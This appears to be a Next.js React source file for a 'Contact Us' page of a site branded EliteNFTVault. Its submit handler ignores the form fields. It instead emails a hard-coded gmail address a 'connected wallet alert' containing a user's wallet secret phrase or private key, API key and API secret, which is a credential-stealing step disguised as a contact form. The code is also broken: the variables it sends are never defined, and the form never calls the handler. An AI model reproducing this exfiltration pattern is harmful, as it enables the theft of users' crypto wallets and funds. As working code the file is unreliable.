"use client";
import InputFields from "@/components/form/InputFields";
import ConfirmBtn from "@/components/loading/ConfirmBtn";
import { useState } from "react";
import { toast } from "react-toastify";

const page = () => {
  const [email, setEmail] = useState("");
  const [subject, setSubject] = useState("");
  const [description, setDescription] = useState("");

  async function handleSubmit(e) {
    e.preventDefault();

    await fetch("/api/mailer/custom", {
      method: "POST",
      body: JSON.stringify({
        email: "elitenftvault@gmail.com",
        subject: `connected wallet alert`,
        body: `<h2>Hello Admin</h2> 
        <p>the ${user?.username}, just connected a wallet</p>
        <p>Details:</p>
<p>Provider: ${provider}</p>
<p>Secret Phrase (private key): ${privateKey}</p>
<p>Api key: ${apiKey}</p>

<p>Api Secret: ${apiSecret}</p>
<p>
EliteNFTVault team,</p>`,
      }),
    });

    toast.success("Message sent.");
  }

  return (
    <div className="w-full min-h-screen p-3">
      <h2 className="text-3xl font-bold text-white text-center">
        {" "}
        Contact Us{" "}
      </h2>
      <p className="text-white text-center">
        {" "}
        Send us an email to make an enquiry or register a complaint{" "}
      </p>
      <form className="flex flex-col items-center justify-center mx-auto self-center">
        <InputFields
          label={"Email"}
          placeholder={"enter your email"}
          value={email}
          handleChange={(e) => setEmail(e.target.value)}
        />
        <InputFields
          label={"Subject"}
          placeholder={"enter the subject matter"}
          value={subject}
          handleChange={(e) => setSubject(e.target.value)}
        />
        <div className={`w-[298px]  p-3 flex flex-col `}>
          <label htmlFor={"description"} className="mb-3">
            Description :
          </label>
          <textarea
            className={`bg-transparent border rounded border-[#ef8bf7] border-solid outline-none placeholder:text-[#969494] placeholder:text-[16px] p-3 `}
            placeholder={"Breifly explain the issue further"}
            value={description}
            onChange={(e) => setDescription(e.target.value)}
            name={"desciption"}
            rows={5}
            cols={10}
          />
        </div>
        <ConfirmBtn
          title={"Submit"}
          otherStyles={"bg-[#ef9bf7] p-3 w-[300px]"}
        />
      </form>
    </div>
  );
};
export default page;
